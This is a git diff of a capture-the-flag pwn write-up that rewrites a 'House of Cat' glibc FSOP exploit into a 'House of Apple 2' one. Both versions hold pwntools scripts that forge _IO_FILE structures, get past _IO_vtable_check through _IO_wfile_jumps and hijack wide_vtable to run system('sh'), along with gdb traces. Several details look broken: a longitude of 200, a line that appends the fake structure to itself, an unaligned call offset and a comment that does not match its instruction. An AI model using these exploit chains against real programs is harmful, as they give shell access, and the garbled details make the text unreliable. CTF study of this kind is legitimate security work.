@@ -1,19 +1,23 @@
 ---
-title: "House of Cat — Reverse Engineering Modern FSOP Bypasses"
-ctf: "ctf archive"
+title: "House of Apple 2 — Breaking 0x78-Byte Constraints with FSOP Underflows"
+ctf: "tjctf 2026"
 category: "pwn"
-difficulty: "medium"
+difficulty: "easy"
 points: null
-date: "2026-05-16"
-lat: 50.71
-lng: 60.00
-summary: "Independently uncovering the House of Cat technique by manually tracing glibc constraints to bypass _IO_vtable_check, manipulating _wide_data structures, and hijacking control flow via _IO_wfile_seekoff."
+date: "2026-05-17"
+lat: -20.71
+lng: 200.00
+summary: "Bypassing small buffer allocation constraints by rigging a fake file structure to trigger an underflow refill primitive, granting a 0x300-byte write to hijack control flow through House of Apple 2 via _IO_wfile_overflow and _IO_wdoallocbuf."
 tags:
   - "heap"
   - "fsop"
-  - "house-of-cat"
-  - "_IO_FILE"
-  - "glibc-2.39"
+  - "underflow"
+  - "house-of-apple-2"
+  - "_IO_wfile_overflow"
+  - "_IO_wdoallocbuf"
+  - "glibc-2.34"
+
+
 ---
     _flags  \ it's like telling glibc here we want to "W" or "R" 
 
@@ -57,34 +61,44 @@ tags:
 
     vtable -| acts like jump table to func
     -----------------------------------------------------------------------------------
-    hmm not that bad at least i understand what i'm saying now about _IO_FILE this shit
+     
+    We need to build a fake file pointer (FP) here so that when it is used in fread(testbuf, 1u, 0x78u, fp);
+    it will give us a primitive like read(fileno, fp_addr, 0x300);
+    So, how do we do that? Since we can only write 0x78 bytes for now, it is not enough to make the 
+    exploit work. We need more bytes, which is why we want to trigger a larger stage-two read.
 
-    Now let's try to overwrite the stdout structure to leak or to write some useful address to stream ;D
+    ----------------------------------------
+    _flags         -> 0xfbad2488 for read
+    
+    _IO_read_ptr   -> 0x0 /| make _IO_read_ptr == _IO_read_end 
+    _IO_read_end   -> 0x0 || why? to force underflow and call the refill routine 
+    _IO_read_base  -> 0x0 \|
+    
+    _IO_write_base -> 0x0
+    _IO_write_ptr  -> 0x0
+    _IO_write_end  -> 0x0
+    
+    _IO_buf_base   -> 0x0 /| read(_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base) 
+    _IO_buf_end    -> 0x0 \|
 
-    -----------------------------------------------------------------------------------
-       ________   __________________________________________________
-       _flags / --> we need to use right flag to force glibc       |\/\_/\.->  0xfbad1800
-       -------    --------------------------------------------------
-       *note -> 3 read pointers set to zero, we need to write
+    _IO_save_base  -> 0x0
+    _IO_backup_base-> 0x0
+    _IO_save_end   -> 0x0
 
-       _IO_write_base -|                    |                          ^                    |                 
-       _IO_write_ptr   |                write_base                     |                write_end                                                                                 
-       _IO_write_end __|                                           write_ptr                                                                 
-
-       here from (write_ptr - write_base) at write_base address will go to 
-       via _IO_do_write   write(1,write_base,(write_ptr - write_base))
-
-        *note -> others remain the same and let's try it
-
-    -----------------------------------------------------------------------------------
+    _markers       -> 0x0
+    _chain         -> 0x0
+    _fileno        -> 0x0 (stdin) 
+    _flags2        -> 0x0
+    ----------------------------------------
+    
 ```python
 #!/usr/bin/env python3
 
 from pwn import *
 
-exe = ELF("./chall_patched")
+exe = ELF("./Ox78_patched")
 libc = ELF("./libc.so.6")
-ld = ELF("./ld-2.39.so")
+ld = ELF("./ld-linux-x86-64.so.2")
 
 context.binary = exe
 
@@ -95,198 +109,136 @@ def conn():
         if args.GDB:
             gdb.attach(r)
     else:
-        r = remote("addr", 1337)
+        r = remote("none", 0x90)
+
     return r
 
 
 def main():
     r = conn()
-
-    stdout = p64(0xfbad1800) # _flags
-    stdout+= p64(0)          # _IO_read_ptr
-    stdout+= p64(0)          # _IO_read_end
-    stdout+= p64(0)          # _IO_read_base
-    stdout+= b"\x00"         # _IO_write_base partial overwrite lowest byte
-    #pause()
-    r.sendlineafter(b"stdout:",stdout)
-    r.recv(1)
-    lib = u64(r.recv(100)[72:80]) - 0x1bd4a0
-
-    log.success(f"LEAK:\nlibc:{hex(lib)}\n")
-    libc.address = lib
-```
-
-
-    Yes, it works! :D NOW we need to abuse the stderr struct to execute system("/bin/sh").
-    I have no idea how I can do it, but let's try since there is a check I see while debugging.
-    Something like that on _io_vtable check:
-
-                                      |
-    ----------------------------------|---
-    lea r12, &_io_vtable              |
-    mov rdx, QWORD ptr [rbx+0xd8]     v
-    sub rdx, r12 -------------------> here it gets the range. If u exceed it, 0x92f will abort
-    cmp rdx, 0x92f
-    ja abort
-    --------------------------------------
-
-    Ok, so overwriting the vtable pointer at stderr+0xd8 with a custom heap address will not work
-    since this check will prevent us... but wait, what if I overwrite it with a nearby 
-    stderr address? Will this abort? Let me check.
-
-    The jump will be taken and there is a 0x1000 difference, so there is no way to do that since we have
-    only 224/0xe0 bytes of input. If we had enough space we could do it, but I don't know, since for 
-    stderr + 0x1000, this range of addresses must all be writable. I think you can do it,
-    but this is messy. So we need to think of another way to bypass the check now?
-
-    If we can force glibc to use wide_vtable... but after all, is there the same check on it? Hmm...
-    I see before jumping to the check, there is another check on _mode at stderr+0xc0. It looks like this:
-
-    -----------------------------------
-    mov eax, DWORD [rdi+0xc0]          \
-    test eax, eax                       \
-    jne check_io_vtable                  \  this is for setting the _mode to 0xffffffff; even if we force it
-    mov DWORD ptr [rdi+0xc0],0xffffffff  /  to be positive, it will change itself to negative again
-    check_io_check the rest             /
-    -----------------------------------/
-
-    Bro, I found another way to do it! We just need to change the vtable pointer to _IO_wfile_jumps + offset.
-    Since it passes the checks (I tried it), now we just need to get a valid offset that forces glibc to use our
-    wide_vtable.
-
-    I see something like that:
-    --------------------------\
-    call QWORD ptr [r15+0x38]  |  _IO_wfile_jumps + 0x38
-    --------------------------/
-
-    *note -> this happens inside _IO_flush_all
-
-    Now we can control what the program executes. From this table, we need to make it point to a function
-    that helps us call something from wide_vtable, but what? Hmm...
-
-    Wait, when the program exits, it calls _IO_cleanup -> _IO_flush_all, and inside it there is something that
-    looks like this. If we take the path to call _IO_wfile_overflow... how to trigger it will be figured out soon.
-    I need to debug it again and again until I find something that can be manipulated.
-    Yes! Finally, I found a great attack vector:
-
-    --------------------------------
-    mov rax, QWORD PTR [rbx + 0x28] \---> here it takes _IO_write_ptr  \
-    cmp QWORD PTR [rbx + 0x20], rax  \--------> takes   _IO_write_base  V
-    jb _IO_file_overflow             /                    _IO_write_base - _IO_write_ptr
-    --------------------------------/-> if _IO_write_ptr > _IO_write_base => jb will be taken
-
     
-    So now we need to know how to redirect execution to _IO_wfile_jumps, but we still need proof.
-    Let's try it:
-    -------------------------------------
-    gef> p *(struct _IO_FILE_plus *) stderr
-    $2 = {
-    file = {
-    _flags = 0x41414141,
-    _IO_read_ptr = 0x0,
-    _IO_read_end = 0x0,
-    _IO_read_base = 0x0,
-    _IO_write_base = 0x0,
-    _IO_write_ptr = 0x1 <error: Cannot access memory at address 0x1>,
-    _IO_write_end = 0x0,
-    _IO_buf_base = 0x0,
-    _IO_buf_end = 0x0,
-    _IO_save_base = 0x0,
-    _IO_backup_base = 0x0,
-    _IO_save_end = 0x0,
-    _markers = 0x0,
-    _chain = 0x0,
-    _fileno = 0x0,
-    _flags2 = 0x0,
-    _old_offset = 0x0,
-    _cur_column = 0x0,
-    _vtable_offset = 0x0,
-    _shortbuf = "",
-    _lock = 0x7b0630805700 <_IO_stdfile_2_lock>,
-    _offset = 0x0,
-    _codecvt = 0x0,
-    _wide_data = 0x43434343,
-    _freeres_list = 0x0,
-    _freeres_buf = 0x0,
-    __pad5 = 0x1,
-    _mode = 0x2,
-    _unused2 = '\000' <repeats 19 times>
-    },
-    vtable = 0x7b0630802228 <_IO_wfile_jumps>
-    }
-    -------------------------------------
-    Hmm, I think it's working, and we are doing such a great job. Now look at this:
+    r.recvuntil(b"File Structure: 0x")
+    fp_addr = int(r.recvline().strip(), 16)
 
-    -------------------------------------
-    mov rax, QWORD PTR [rax+0xa0]  -> here is wide_data
-    mov rsi, QWORD PTR [rax+0x20]  -> from _IO_write_ptr in wide_data
-    cmp QWORD PTR [rax+0x18], rsi  -> _IO_write_base > _IO_write_ptr
-    jae call rax+0x18
-    -------------------------------------
+    r.recvuntil(b"well: ")
+    lib = int(r.recvline().strip(),16) - libc.sym['puts']
+    libc.address = lib 
+    log.success(f"LEAK:\nlibase:{hex(lib)}\n")
 
-    I satisfied this check and yes, it works! But I wonder what to call from _IO_wfile_jumps.
-    I chose _IO_wfile_seekoff with the right offset.
+    fp0 = p64(0xfbad2488)       # _flags
+    fp0+= p64(0)                # _IO_read_ptr
+    fp0+= p64(0)                # _IO_read_end
+    fp0+= p64(0)                # _IO_read_base
+    fp0+= p64(0)                # _IO_write_base
+    fp0+= p64(0)                # _IO_write_ptr
+    fp0+= p64(0)                # _IO_write_end
+    fp0+= p64(fp_addr)          # _IO_buf_base
+    fp0+= p64(fp_addr+0x300)    # _IO_buf_end
+    fp0+= p64(0)*3              # 3 dummys pointers
+    fp0+= p64(0)                # _markers
+    fp0+= p64(0)                # _chain
+    fp0+= p32(0)                # _fileno
+    fp0+= p32(0)                # _flags2
+```
+    
+    Yes, it works! Now the console waits for input, and we can overwrite the file pointer with 0x300 bytes.
+    Trigger whatever you want! Now we can basically build the entire _IO_FILE_plus structure and hijack wide_vtable.
+    I will trigger _IO_wfile_overflow when _IO_flush_all checks our file pointer using:
+    _IO_write_ptr > _IO_write_base
+    --------------------------------------------------------------~
+    mov rax, QWORD PTR [rbx+0x20] ~> _IO_write_base
+    cmp QWORD PTR [rbx+0x28], rax ~> _IO_write_end - _IO_write_base
+    ja _IO_wfile_jumps            
+    --------------------------------------------------------------~
+    
+    How does _IO_wfile_overflow get called? If we overwrite the vtable pointer at offset 0xd8 on _IO_FILE_plus
+    with _IO_wfile_jumps, this will pass the initial checks and call _IO_wfile_overflow. Let's look:
+    -----------------------------------------------------------~
+    ja |
+       V
+       mov rax, QWORD PTR [rbx+0xd8]
+       mov rcx, rax                    
+       sub rcx, r13
+       cmp rbp, rcx
+       jbe abort    -> if _IO_jumps is not in the correct range, it will exit
 
-    ----------------------------------------------
-    It ends up calling __GI__IO_switch_to_wget_mode.
-    Looking inside, it calls a function from wide_vtable:
-    mov rax, QWORD PTR [rdi+0xa0]
-    Here it checks if _IO_write_base > _IO_write_ptr
-    Then: mov rax, QWORD PTR [rax+0xe0] -> wide_vtable
-    No more stupid checks.
-    Just pure call:
-    call QWORD PTR [rax+0x18]
-    ----------------------------------------------
+    mov rdi, rbx
+    call QWORD PTR [rax+0x18] ~> calls _IO_wfile_overflow
+    -----------------------------------------------------------~
+    
+    Now inside _IO_wfile_overflow, we need to force glibc to call from wide_vtable.
+    The great part is there are no more strict validation checks here like the previous abort one.
+    We can see that if we set wide_data->_IO_write_base = 0, then _IO_wdoallocbuf will be called:
+    --------------------------------------------------------~
+    mov rdx, QWORD PTR [rdi+0xa0] ~> wide_data
+    cmp QWORD PTR [rdx+0x18], 0   ~> wide_data._IO_write_base
+    je _IO_wdoallocbuf
+    --------------------------------------------------------~
 
-    And yes, with a little bit of debugging and making correct pointers within just 0xd8 bytes,
-    we make rax+0x18 point to the address of system(), and rdi (the file pointer) becomes the argument for system when called.
-    The key is to bypass the _io_vtable check by pointing our main vtable to _IO_wfile_jumps. From there, we force
-    glibc to call a function from our fake wide_vtable—bypassing all modern checks so we can even point it to our ROP stack pivot!
+    So let's trace the jump to it:
+    --------------------------------------------------------------~
+    je |
+       V
+       mov rax, QWORD PTR [rdi+0xa0]
+       cmp QWORD PTR [rax+0x30], 0   ~> check if _IO_buf_base == 0
+       je target_branch |
+                        V
+                        mov rax, QWORD PTR [rax+0xe0]
+                        call QWORD PTR [rax+0x64]
+    --------------------------------------------------------------~
 
-    ----------------------------------------------
-    [ #2] 0x78e7e98585bb <do_system+0x2eb>
-    [ #3] 0x78e7e988afe0 <_IO_switch_to_wget_mode+0x30> (frame name: __GI__IO_switch_to_wget_mode)
-    [ #4] 0x78e7e988d2ed <_IO_wfile_seekoff+0x6d> (frame name: __GI__IO_wfile_seekoff)
-    [ #5] 0x78e7e98961e6 <_IO_flush_all+0xe6> (frame name: __GI__IO_flush_all)
-    [ #6] 0x78e7e989680d <_IO_cleanup+0x2d>
-    [ #7] 0x78e7e9847b74 <__run_exit_handlers+0x264>
-    [ #8] 0x78e7e9847bbe <NO_SYMBOL>
-    [ #9] 0x78e7e982a1d1 <__libc_start_call_main+0x81>
-    ----------------------------------------------
+    No more boundary checks, just pure direct jumps! That is exactly what we need since we completely 
+    control the wide_vtable pointer. We can set it to the correct offset to make it point directly to 
+    system(), and the argument passed to it will be our custom string stored in the _flags field via RDI.
+    
+    --------------------------------------------------------------------------------------~
+    [ #2] 0x74464405494b <do_system+0x2eb>
+    [ #3] 0x744644087bee <_IO_wdoallocbuf+0x2e> (frame name: __GI__IO_wdoallocbuf)
+    [ #4] 0x74464408a5d5 <_IO_wfile_overflow+0x265> (frame name: __GI__IO_wfile_overflow)
+    [ #5] 0x744644092972 <_IO_flush_all_lockp+0xe2>
+    [ #6] 0x744644092b1e <_IO_cleanup+0x2e>
+    [ #7] 0x744644049592 <__run_exit_handlers+0x1b2>
+    [ #8] 0x744644049660 <on_exit> (frame name: __GI_exit)
+    [ #9] 0x74464402dfd7 <__libc_start_call_main+0x87>
+    --------------------------------------------------------------------------------------~
 
 ```python
-    stderr = b"/bin/sh\x00"  # _flags what ever it is
-    stderr+= p64(0)          # _IO_read_ptr
-    stderr+= p64(0)          # _IO_read_end
-    stderr+= p64(libc.sym['system']) # _IO_read_base
-    stderr+= p64(0)          # _IO_write_base
-    stderr+= p64(1)          # _IO_write_ptr to bypass the check and jumps to _IO_wflie
-    stderr+= p64(0)          # _IO_write_end
-    stderr+= p64(0)*3        # three dummy pointers ;D
-    stderr+= p64(0)          # _markers
-    stderr+= p64(0)          # _chain hmm... idk
-    stderr+= p64(0)          # _fileno
-    stderr+= p64(0)          # _flags2
-    stderr+= p64(0)          # _old_offset
-    stderr+= p64(0)          # _cur_column
-    stderr+= p32(0)          # _vtable_offset
-    stderr+= p32(0)          # _short_buf
-    stderr+= p64(libc.sym['_IO_stdfile_2_lock']) # keep same
-    stderr+= p64(0)          # _offset
-    stderr+= p64(0)          # _codecvt
-    stderr+= p64(libc.sym['_IO_2_1_stderr_']-0x20)#+0x8) # wide_data
-    stderr+= p64(0)          # freeres_list
-    stderr+= p64(0)          # freeres_buf
-    stderr+= p64(1)          # _pad5
-    stderr+= p64(libc.sym['_IO_2_1_stderr_'])          # _mode
-    stderr+= p64(0)*2        # _unused2
-    stderr+= p64(libc.sym['_IO_wfile_jumps']+0x30)       # vtable
+    fp = b"aaaa;sh\x00"            # _flags
+    fp+= p64(fp_addr+0x10)          # _IO_read_ptr
+    fp+= p64(fp_addr+0x10)          # _IO_read_end
+    fp+= p64(0)                     # _IO_read_base
+    fp+= p64(0)                     # _IO_write_base
+    fp+= p64(1)                     # _IO_write_ptr
+    fp+= p64(0)                     # _IO_write_end
+    fp+= p64(0)                     # _IO_buf_base
+    fp+= p64(0)                     # _IO_buf_end
+    fp+= p64(0)*3                   # 3 dummys pointers
+    fp+= p64(0)                     # _markers
+    fp+= p64(0)                     # _chain
+    fp+= p32(0)                     # _fileno
+    fp+= p32(0)                     # _flags2
+    fp+= p64(0)                     # _old_offset
+    fp+= p64(0)                     # _cur_column &_vtable_offset...
+    fp+= p64(libc.sym['_IO_stdfile_2_lock']) # _lock
+    fp+= p64(0)                     # _offset
+    fp+= p64(0)                     # _codecvt
+    fp+= p64(fp_addr+0x100)         # _wide_data
+    fp+= p64(0)                     
+    fp+= p64(0)
+    fp+= p64(0)
+    fp+= p64(0)                    # _mode
+    fp+= p64(0)*2                  # _unused2
+    fp+= p64(libc.sym['_IO_wfile_jumps']) # vtable
+    fp+= fp.ljust(0x100,b"\x00")          #
+    fp+= p64(fp_addr+0x180)               # play with pointers 
+    fp+= p64(libc.sym['system'])          # 
 
-    r.sendline(stderr)
-    r.recvuntil("stderr:")
+    
+    pause()
+    r.send(fp0)
+    r.send(fp)
 
     r.interactive()
-
 if __name__ == "__main__":
-    main()
+        main()
 ```
